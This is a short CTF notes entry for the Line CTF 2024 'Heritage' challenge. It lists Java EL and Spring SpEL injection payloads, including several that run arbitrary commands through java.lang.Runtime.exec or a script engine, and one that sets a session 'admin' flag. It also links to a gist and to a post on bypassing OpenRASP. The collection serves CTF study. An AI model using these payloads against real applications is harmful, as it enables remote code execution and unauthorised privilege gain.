---
title: "Line CTF 2024 - Heritage"
description: "
EL Injection / SpEL Injection

EL = Expression Language, SpEL = Spring Expression Language
Some payload

${\"a\".toString()}
${\"\".getClass()}
${applicationScope}
${sessionScope.toString()}
${pageContext.request.getSession().setAttribute(\"admin\", true)}
${T(java.lang.Runtime).getRuntime().exec(\"<my command here>\")}
${Class.forName('java.lang.Runtime').getRuntime().invoke(null).exec(<RCE>).getInputStream().read()}
${\"\".getClass().forName(\"java.lang.Runtime\").getMethods()[6].invoke(\"\".getClass().forName(\"java.lang.Runtime\")).exec(\"calc.exe\")}
${request.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"java.lang.Runtime.getRuntime().exec(\\\\"ping x.x.x.x\\\\")\"))}


Example


Seikai CTF 2023 - Frog WAF
繞 openrasp: https://landgrey.me/blog/15/



"
external_url: "https://gist.github.com/tyage/e0afc9ff5051c2cc487a8cd9b6a1d7ea#heritage"
category: "Black Hat Tools"
---
